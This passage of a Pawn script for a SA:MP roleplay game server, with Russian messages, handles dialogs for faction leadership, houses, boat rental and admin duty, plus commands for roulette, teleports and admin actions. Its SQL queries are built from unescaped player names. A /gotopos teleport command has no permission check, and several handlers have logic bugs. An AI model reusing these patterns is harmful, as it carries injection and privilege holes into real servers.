			{
			case 0: return true;
			case 1: return true;
			case 2:
				{
					sscanf(FracInfo[i][fLeader], "u", playerd);
					if(!strcmp(FracInfo[listitem+1][fLeader], "None",false))
					{
						if(IsPlayerConnected(playerd))
						{
							LeaveFractionPlayer(playerd);
							TextDrawHideForPlayer(playerid,ButtonLeft);
							TextDrawHideForPlayer(playerid,ButtonRight);
							TextDrawHideForPlayer(playerid,ButtonSelect);
							TextDrawHideForPlayer(playerid,ButtonCancel);
							CancelSelectTextDraw(playerid);
							SendMes(playerd, COLOR_BLUE, "Администратор %s снял вас с должности лидера организации", PlayerInfo[playerid][pSendername]);
						}
						else
						{
							format(query,sizeof(query), "UPDATE "TABLE_ACCOUNT"  SET member = 0, leader = 0, rank = 0 WHERE name = '%s'", FracInfo[i][fLeader]);
							mysql_query(query);
						}
					}
					SendMes(playerid, COLOR_ORANGE, "Вы сняли %s с должности лидера организации ",FracInfo[i][fLeader]);
					SetFractionStr(i, "leader", "None");
					strmid(FracInfo[i][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
				}
			}
			DeletePVar(playerid, "NumberFrac");
			return true;
		}
	case D_JOB+139:
		{
			new Float:X, Float:Y, Float:Z;
			if(!response) return true;
			switch(listitem)
			{
			case 0: X=1790.0270, Y=-1909.7218, Z=13.0;
			case 1: X=1745.9421, Y=-1878.5831, Z=29.9361;
			case 2: X=-1969.5084, Y=139.4100, Z=36.6420;
			case 3: X=-2048.9243, Y=-94.2897, Z=34.8485;
			case 4: X=1801.7378, Y=-1856.4799, Z=13.0746;
			case 5: X=1481.2532, Y=-1742.1619, Z=13.2;
			case 6: X=2127.5491, Y=2366.5493, Z=10.8203;
			case 7: X=214.0270, Y=1915.1, Z=17.0;
			case 8: X=-1335.0730, Y=466.1, Z=6.867;
			case 9: X=1642.1754, Y=-1067.7218, Z=23.0;
			case 10: X=1539.5493, Y=-1675.5831, Z=13.9361;
			case 11: X=-1605.2648, Y=721.4100, Z=11.6420;
			case 12: X=-1979.2177, Y=-1012.8572, Z=32.1719;
			case 13: X=1463.0959, Y=2773.2125, Z=10.2266;
			case 14: X=2489.9377, Y=1537.0015, Z=10.6749;
			case 15: X=948.9276, Y=1733.1798, Z=8.8516;
			case 16: X=597.6091, Y=870.6889, Z=-43.1639;
			case 17: X=-367.2575, Y=-1426.5400, Z=25.7266;
			case 18: X=1790.5295, Y=-1910.3073, Z=13.3970;
			case 19: X=-465.8459, Y=1462.0729, Z=21.6365;
			case 20: X=2565.8208, Y=2783.5242, Z=10.8203;
			case 21: X=-147.6650, Y=1112.1145, Z=19.7500;
            }
			if (GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
			else SetPlayerPos(playerid, X, Y, Z);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
		}
		case D_DACH:
		{
          if(response)
		  {
          new idx = GetPVarInt(playerid, "PlayerDUCH");
		  if(!strcmp(HouseInfo[idx][dOwner],"None_None",true))
		  {
		     if(PlayerInfo[playerid][pCash] < GetInflationPrice(HouseInfo[idx][dPrice])) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
	         else
		     {
     		   new dach = 0;
		       for(new i = 1; i <= TOTALDUCH;i++) { if(!strcmp(HouseInfo[i][dOwner],PlayerInfo[playerid][pSendername],true)) dach++; }
		       if(dach != 0) return SendClientMessage(playerid, COLOR_GREY, "У вас уже есть дача!");
		       PlayerInfo[playerid][pCash] -= GetInflationPrice(HouseInfo[idx][dPrice]);
		       GameTextForPlayer(playerid, "You just bought a summer house", 3000, 5);
		       SendMes(playerid, -1, "Вы купили дачу за %i долларов. У вас осталось: %i долларов",GetInflationPrice(HouseInfo[idx][dPrice]), PlayerInfo[playerid][pCash]);
	       	   strmid(HouseInfo[idx][dOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
		       format(query, sizeof(query), "UPDATE "TABLE_DUCH" SET `dOwner` = '%s' WHERE `dID` = '%d' LIMIT 1", HouseInfo[idx][dOwner], idx);
		       mysql_query(query);
		       SetPlayerPos(playerid,HouseInfo[idx][dExitx],HouseInfo[idx][dExity],HouseInfo[idx][dExitz]);
	           SetPlayerInterior(playerid,HouseInfo[idx][dInt]);
		       SetPlayerVirtualWorld(playerid,HouseInfo[idx][dVirtual]);
		       Exchequer+=GetInflationPrice(HouseInfo[idx][dPrice]);
	       	   f(query, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
		       mysql_query(query);
		       UpdateDacha(idx);
		     }
		  }
		  else
		  {
				if(HouseInfo[idx][dLock] == 1)
				{
						if(strcmp(PlayerInfo[playerid][pSendername], HouseInfo[idx][dOwner], true) == 0) ShowPlayerDialog(playerid, D_DACH+1, 0, "Дом", "Ваш дом закрыт\n\nВы хотите его открыть?", "Да", "Нет");
						GameTextForPlayer(playerid, "~r~Locked", 5000, 1);
				}
				else
				{
						SetPlayerPos(playerid,HouseInfo[idx][dExitx],HouseInfo[idx][dExity],HouseInfo[idx][dExitz]);
						SetPlayerInterior(playerid,HouseInfo[idx][dInt]);
						SetPlayerVirtualWorld(playerid,HouseInfo[idx][dVirtual]);
			}
				}
			}
		}
		case D_DACH+1:
		{
		    if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerDUCH");
			HouseInfo[i][dLock] = 0;
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~g~unlock", 5000, 5);
			format(string, 90, "%s открывает замок дачи", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
			SetDachaInt(i, "dLock", HouseInfo[i][dLock]);
			return true;
       }
	   case D_DACH+2:
	   {
	        if(!response) return true;
			new ads = GetPVarInt(playerid, "PlayerDUCH");
			switch(listitem)
			{
			   case 0:
			   {
                    if(HouseInfo[ads][dLock] == 1)
					{
						HouseInfo[ads][dLock] = 0;
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						GameTextForPlayer(playerid, "~g~unlock", 5000, 5);
						format(string, 90, "%s достал ключи и открыл дверь дачи", PlayerInfo[playerid][pSendername]);
						ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
						SetDachaInt(ads, "dLock", HouseInfo[ads][dLock]);
					}
					else
					{
						if(HouseInfo[ads][dLock] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваша дача уже закрыта!");
						HouseInfo[ads][dLock] = 1;
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						GameTextForPlayer(playerid, "~r~lock", 5000, 5);
						format(string, 90, "%sдостал ключи и закрыл дверь дачи", PlayerInfo[playerid][pSendername]);
						ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
						SetDachaInt(ads, "dLock", HouseInfo[ads][dLock]);
					}
			   }
			   case 1: ShowPlayerDialog(playerid, D_DACH+3, 0, "Продать дачу", "Вы хотите продать свой дачу?", "Да", "Нет");
			}
			return true;
		}
		case D_DACH+3:
		{
           if(!response) return true;
 	       new i = GetPVarInt(playerid, "PlayerDUCH");
		   strmid(HouseInfo[i][dOwner], "None_None", 0, strlen("None_None"), MAX_PLAYER_NAME);
		   HouseInfo[i][dLock] = 0;
		   SetDachaStr(i, "dOwner", "None_None");
	       SendMes(playerid, COLOR_LIGHTRED, "Вы продали свой дачу государству за %d",HouseInfo[i][dPrice]);
		   UpdateDacha(i);
		   PlayerInfo[playerid][pBank] += HouseInfo[i][dPrice];
		   GameTextForPlayer(playerid, "The house sold", 3000, 5);
		   format(query, sizeof(query), "UPDATE "TABLE_HOUSE" SET  `dOwner` = '%s', `dLock` = %d WHERE dID = %d LIMIT 1", HouseInfo[i][dOwner], HouseInfo[i][dLock], i);
		   mysql_query(query);
		   return true;
		 }
		 case D_ARENSD:
		 {
            if(!response) return true;
            if(GetMoney(playerid) < 500) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
            vehiclek[playerid] = CreateVehicle(446,227.0035,-2070.0830,-0.5700, 117.8207, -1, -1, 3000);
			SendClientMessage(playerid, COLOR_BLUE, "Вы арендовали лодку за 500 долларов");
			GiveMoney(playerid, -500);
			rendlodk[playerid] = 1;
          //  new Float:vehx, Float:vehy, Float:vehz;
          //  GetVehiclePos(vehiclek[playerid], vehx, vehy, vehz);

          //  new Float: posx,Float:posy,Float:posz;
          //  GetPlayerPos(playerid,posx,posy,posz);
          ///  SendMes(playerid, COLOR_LIGHTRED, "Расстояние до тачки: %f,%f,%f",vehx-posx,vehy-posy,vehz-posz);
			return true;
		 }
		 case D_DOSTUPADM:
		 {
             if(!response) return GKick(playerid);
             if(strval(inputtext) == PlayerInfo[playerid][pDostup])
             {
           		SendClientMessage(playerid, COLOR_YELLOW, "Вы успешно вышли на дежурство!");
		        PlayerInfo[playerid][pAdminDuty] = 1;
		        SetHealth(playerid, 100);
                SetArmour(playerid, 100);
		        format(string, sizeof(string), "Администратор %s выходит на дежурство.", PlayerInfo[playerid][pSendername]);
		        //SendMesToAll(COLOR_GREEN, string);
		        AdminLogged[playerid] = true;
			 }
			 else 
			 {
			   GKick(playerid);
			 }
			 return true;
		 }
	}
	printf("Игрок %s успешно использовал диалог номер %i", PlayerInfo[playerid][pSendername], dialogid);
	return true;
}
forward ReFill(playerid);
public ReFill(playerid)
{
	new string[32];
	Fuel[GetPlayerVehicleID(playerid)]++;
	SetPVarInt(playerid, "Filling", GetPVarInt(playerid, "Filling") + 1);
	format(string,32,"~g~filling ~w~%i ~g~liters",GetPVarInt(playerid, "Filling"));
	GameTextForPlayer(playerid, string, 600, 6);
	if(GetPVarInt(playerid, "Refueling") <= GetPVarInt(playerid, "Filling"))
	{
		KillTimer(ReFuelTimer[playerid]);
		DeletePVar(playerid, "Refueling");
		DeletePVar(playerid, "Filling");
		TogglePlayerControllable(playerid, true);
	}
	return true;
}
//==============================================================================
CMD:deal(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != F_CASINO) return SendClientMessage(playerid,0xFFFFFFAA,"Вы не работник казино Калигула!");
	if(CasinoDuty[playerid] != 1) return SendClientMessage(playerid,COLOR_WHITE,"Вам необходимо начать рабочий день в казино!");
	if(Barabanchik != 0.00) return SendClientMessage(playerid,COLOR_WHITE,"Рулетка уже запущена!");
	new string[64];
	if(CasinoDuty[playerid] == 1)
	{
		if(IsPlayerInRangeOfPoint(playerid,3.0,2231.0784,1619.5814,1007.1223))
		{
			new bool:proverka;
			for (new i=0;i<MAX_PLAYERS;i++)
			{
				if (UseRoulette[i] == 1 && RouletteStart[i]==true)
				{
					proverka=true;
					PlayerPlaySound(i, 33400, 0.0, 0.0, 0.0);
				}
			}
			if(proverka == false) return SendClientMessage(playerid,COLOR_WHITE,"Никто ещё не сделал ставку за этим столом!");
			RouletteRunned[0] = true;
			KrupieTime[0] = 0;
			CroupierN[0] = playerid;
			Update3DTextLabelText(CasinoText[0], COLOR_ORANGE, "Стол №1: {b6c60c}ставки не принимаются");
			RuletTimer = SetTimer("RuletCheck", 100, 1);
			format(string, 64, "%s крутанул рулетку", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,23.0,COLOR_PURPLE,string);
			SetPlayerChatBubble(playerid,"Крутанул рулетку",COLOR_PURPLE,20.0,5);
			return true;
		}
		else if (IsPlayerInRangeOfPoint(playerid,3.0,2242.4980,1619.5001,1006.2346))
		{
			if (PlayerInfo[playerid][pMember] != F_CASINO) return SendClientMessage(playerid,0xFFFFFFAA,"Вы не работник казино Калигула!");
			if (CasinoDuty[playerid] !=1 ) return SendClientMessage(playerid,COLOR_WHITE,"Вам необходимо начать рабочий день в казино!");
			if(Barabanchik2 != 0.00) return SendClientMessage(playerid,COLOR_WHITE,"Рулетка уже запущена!");
			new bool:proverka;
			for (new i=0;i<MAX_PLAYERS;i++)
			{
				if (UseRoulette[i] == 2 && RouletteStart[i]==true)
				{
					proverka=true;
					PlayerPlaySound(i, 33400, 0.0, 0.0, 0.0);
				}
			}
			if(proverka==false) return SendClientMessage(playerid,COLOR_WHITE,"Никто ещё не сделал ставку за этим столом!");
			RouletteRunned[1] = true;
			KrupieTime[1] = 0;
			CroupierN[1] = playerid;
			RuletTimer2 = SetTimer("RuletCheck2", 100, 1);
			Update3DTextLabelText(CasinoText[1], COLOR_ORANGE, "Стол №2: {b6c60c}ставки не принимаются");
			format(string, 64, "%s крутанул рулетку", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid ,23.0,COLOR_PURPLE,string);
			SetPlayerChatBubble(playerid,"крутанул рулетку",COLOR_PURPLE,20.0,5);
			return true;
		}
		else return SendClientMessage(playerid,0xFFFFFFAA,"Вы не возле игрального стола!");
	}
	return true;
}
//==============================================================================
CMD:dice(playerid, params[])
{
	new string[128];
	if(PlayerLogged[playerid] == 0) return true;
	if(pDice[playerid] != 1) return SendClientMessage(playerid, COLOR_LIGHTRED, "У вас нету костей!");
	new randdice = random(12);
	format(string, 128, "%s бросил кости, выпало %d из 12", PlayerInfo[playerid][pSendername], randdice);
	ProxDetector(20.0, playerid, string,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2);
	return true;
}
//==============================================================================
CMD:report(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	ShowPlayerDialog(playerid, D_MAINMENU, 2, "Панель управления аккаунтом", "{FFFFFF}1.) Статистика персонажа\n2.) {00FF00}Жалоба/Вопрос{FFFFFF} <===\n3.) Настройки\n4.) Команды сервера\n5.) Полезная информация\n6.) Радио '"Namesitet"'\n7.) Донат", "Далее", "Выход");
	return true;
}
//==============================================================================
CMD:setskill(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	SetPlayerSkills(playerid);
	return true;
}
//==============================================================================
CMD:sethp(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /sethp [id игрока] [кол-во жизней]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 100 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-во жизней от 1 до 100!");
	PlayerInfo[params[0]][pHeal] = params[1];
	PlayerInfo[params[0]][pHealthS] = params[1];
	SetHealth(params[0], params[1]);
	SendMes(params[0], COLOR_ORANGE, "Вам изменили жизненное состояние на %d процентов",params[1]);
	SendMes(playerid, COLOR_ORANGE, "Вы установили жизней игроку: %s", sendername(params[0]));
	return true;
}
//==============================================================================
CMD:setsatiety(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setsatiety [id игрока] [кол-во сытости]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 10000 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Кол-во сытости от 0 до 100!");
	PlayerInfo[params[0]][pSatiety] = params[1];

	SendMes(playerid, COLOR_ORANGE, "Вы установили сытость игроку: %s", sendername(params[0]));
	return true;
}
//==============================================================================
CMD:setam(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "ud", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setam [id игрока] [кол-во брони]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 100 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Кол-во брони от 0 до 100!");
	SetArmour(params[0], params[1]);
	SendMes(playerid, COLOR_ORANGE, "Вы установили брони игроку: %s", sendername(params[0]));
	return true;
}
//==============================================================================
CMD:clearchat(playerid, params[])
{
	new string[64];
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	new a;
	while(a++ < 100)
	{
		SendClientMessageToAll(COLOR_LIGHTRED, "");
	}
	format(string, 100,  "Администратор: %s очистил чат",PlayerInfo[playerid][pSendername]);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	return true;
}
//==============================================================================
CMD:cnn(playerid, params[])
{
	new string[64];
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /cnn [текст]");
	format(string, 64, "~b~%s: ~w~%s",PlayerInfo[playerid][pSendername],params[0]);
	GameTextForAll(string, 5000, 6);
	return true;
}
//==============================================================================
CMD:setint(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setint [id игрока] [id интерьера]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	SendMes(playerid, COLOR_ORANGE, "Вы установиил интерьер: %s", sendername(params[0]));
	SetPlayerInterior(params[0], params[1]);
	return true;
}
//==============================================================================
CMD:hospital(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsPlayerInRangeOfPoint(playerid, 3.0,1192.0200,-1362.4286,1584.9851))
	if(PlayerInfo[playerid][pCash] < 800) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств!");
	if(PlayerInfo[playerid][pHospital] == 1 || PlayerInfo[playerid][pHeal] <= 50)
	{
		if(playerid >= 100) return SendClientMessage(playerid, COLOR_GREY, "Вы не нуждаетесь в лечении!");
		GiveMoney(playerid, -800);
		PlayerInfo[playerid][pHospital] = 0;
		SetPlayerFacingAngle(playerid, -90);
		GameTextForPlayer(playerid, "~r~-800$", 1000, 1);
		SetPlayerPos(playerid, 1178.6472,-1327.3912,14.1304);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
		SetHealth(playerid, 100.0);
		return true;
	}
	else SendMes(playerid,-1,"Вы здоровы!");
	return true;
}
//==============================================================================
CMD:setname(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new string[256];
	new oldname[32];
	GetPlayerName(setname,oldname,32);
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(setname == -1) return SendClientMessage(playerid, COLOR_GREY, "Никто не предлагал сменить ник!");
	if(!strcmp(PlayerName[setname],"None",true)) return SendMes(playerid, COLOR_GREY, "Игрок %s не предлагал сменить ник!", sendername(setname));
	if(GetPlayerHouse(setname))
	{
		new i = GetPVarInt(setname, "PlayerHouse");
		if(!strcmp(HouseInfo[i][hOwner],oldname,true))
		{
			format(HouseInfo[i][hOwner],32,PlayerName[setname]);
			SetHouseStr(i, "hOwner", PlayerName[setname]);
		}
	}
	if(GetPlayerBizz(setname))
	{
		new i = GetPVarInt(setname, "PlayerBizz");
		if(!strcmp(BizzInfo[i][bOwner],oldname,true))
		{
			format(BizzInfo[i][bOwner],32,PlayerName[setname]);
			SetBizzStr(i, "owner", PlayerName[setname]);
			UpdateBizz(i);
		}
	}
	if(PlayerInfo[setname][pLeader] !=0)
	{
		strmid(FracInfo[PlayerInfo[setname][pLeader]][fLeader],PlayerName[setname],0,strlen(PlayerName[setname]),MAX_PLAYER_NAME);
		SetFractionStr(PlayerInfo[setname][pLeader], "leader", PlayerName[setname]);
	}
	format(query,sizeof(query),"UPDATE "TABLE_ACCOUNT" SET name='%s' WHERE name='%s'",PlayerName[setname], oldname);
	mysql_query(query);
	SendMes(playerid, COLOR_ORANGE, "Вы сменили ник игрока %s на %s", oldname, PlayerName[setname]);
	format(string, 90, "» %s теперь известен как %s",oldname, PlayerName[setname]);
	SendClientMessageToAll(COLOR_YELLOW, string);
	SetPlayerName(setname,PlayerName[setname]);
	SendMes(setname, COLOR_LIGHTRED, "Ваше новое имя игрока: {ffffff}%s", PlayerName[setname]);
	SendClientMessage(setname, COLOR_LIGHTRED, "Рекмоендуется сделать скриншот. Клавиша: {ffffff}F8");
	SendClientMessage(setname, COLOR_LIGHTRED, "Пропишите свой новый ник в окне {ffffff}SA:MP");
	strmid(PlayerName[setname], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	GKick(setname);
	setname = -1;
	return true;
}
//==============================================================================
CMD:tie(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAMafia(playerid))
	{
		if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /tie [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");new Float:possed[4], string[92];
		GetPlayerPos(params[0],possed[0],possed[1],possed[2]);
		if(!IsPlayerInRangeOfPoint(playerid, 1, possed[0],possed[1],possed[2])) return SendClientMessage(playerid, COLOR_WHITE, "Вы слишком далеко от данного игрока");
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете связать себя!");
		if(PlayerTied[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже связан!");
		SendMes(playerid, 0x6495EDFF, "Вы связали %s", sendername(params[0]));
		SendMes(params[0], 0x6495EDFF, "%s связал вас", sendername(playerid));
		format(string, 90, "%s связал(а) %s", sendername(playerid), sendername(params[0]));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		format(string, 16, "~r~tieted");
		GameTextForPlayer(playerid, string, 5000,5);
		format(string, 16, "~r~tieted");
		GameTextForPlayer(params[0], string, 5000,5);
		TogglePlayerControllable(params[0], 0);
		PlayerTied[params[0]] = true;
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
//==============================================================================
CMD:untie(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAMafia(playerid))
	{
		if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /untie [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
		new Float:possed[4], string[92];
		GetPlayerPos(params[0],possed[0],possed[1],possed[2]);
		if(!IsPlayerInRangeOfPoint(playerid, 1, possed[0],possed[1],possed[2])) return SendClientMessage(playerid, COLOR_WHITE, "Вы слишком далеко от данного игрока");
		if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете развязать себя!");
		if(!PlayerTied[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Игрок не связан!");
		SendMes(playerid, 0x6495EDFF, "Вы развязали %s", sendername(params[0]));
		SendMes(params[0], 0x6495EDFF, "%s развязал вас", sendername(playerid));
		format(string, 90, "%s развязал(а) %s", sendername(playerid), sendername(params[0]));
		ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, string);
		format(string, 16, "~g~untied");
		GameTextForPlayer(playerid, string, 5000,5);
		format(string, 16, "~g~untied");
		GameTextForPlayer(params[0], string, 5000,5);
		TogglePlayerControllable(params[0], 1);
		PlayerTied[params[0]] = false;
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:gotopos(playerid, params[]) {
    if(sscanf(params,"iii",params[0x0],params[0x1],params[0x2])) return (SendClientMessage(playerid, -1,"/gotopos x y z"));
    SetPlayerPos(playerid, params[0x0],params[0x1],params[0x2]);
    return true;
}
CMD:goto(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /goto [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	new Float:plocx,Float:plocy,Float:plocz;
	GetPlayerPos(params[0], plocx, plocy, plocz);
	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
		PlayerInfo[ playerid ][ pPos_x ] = plocx;
		PlayerInfo[ playerid ][ pPos_y ] = plocy;
		PlayerInfo[ playerid ][ pPos_z ] = plocz;
		SetPVarInt(playerid, "AntiBreik", 3);
	}
	else
	{
		SetPlayerPos(playerid,plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	}
	SendClientMessage(playerid, COLOR_ORANGE, "Вы были телепортированы");
	return true;
}

CMD:jumpcar(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, -1, "Введите: /jumpcar [id транспорта]");
	new Float:x, Float:y, Float:z;
	GetVehiclePos(params[0], x, y, z);
	SetPlayerPos(playerid, x+2, y+2, z);
	SendClientMessage(playerid, COLOR_ORANGE, "Вы были телепортированы");
	return true;
}

CMD:gethere(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /gethere [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	new Float:plocx,Float:plocy,Float:plocz;
	GetPlayerPos(playerid, plocx, plocy, plocz);
	if (GetPlayerState(params[0]) == 2)
	{
		new tmpcar = GetPlayerVehicleID(params[0]);
		SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
		PlayerInfo[ params[0] ][ pPos_x ] = plocx;
		PlayerInfo[ params[0] ][ pPos_y ] = plocy;
		PlayerInfo[ params[0] ][ pPos_z ] = plocz;
		SetPVarInt(params[0], "AntiBreik", 3);
	}
	else
	{
		SetPlayerPos(params[0],plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(params[0], GetPlayerVirtualWorld(playerid));
		SetPlayerInterior(params[0], GetPlayerInterior(playerid));
	}
	SendMes(params[0], COLOR_LIGHTRED, "Вы были телепортированы администратором: %s",PlayerInfo[playerid][pSendername]);
	SendMes(playerid, COLOR_ORANGE, "Вы телепортировали игрока: %s",sendername(params[0]));
	return true;
}

CMD:settime(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /settime [время]");
	if(params[0] < 0 || params[0] > 23) return SendClientMessage(playerid, COLOR_GREY, "Время от 0 до 23!");
	SendMes(playerid, COLOR_ORANGE, "Время установлено: %i", params[0]);
	SetWorldTime(params[0]);
	return true;
}

CMD:weather(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
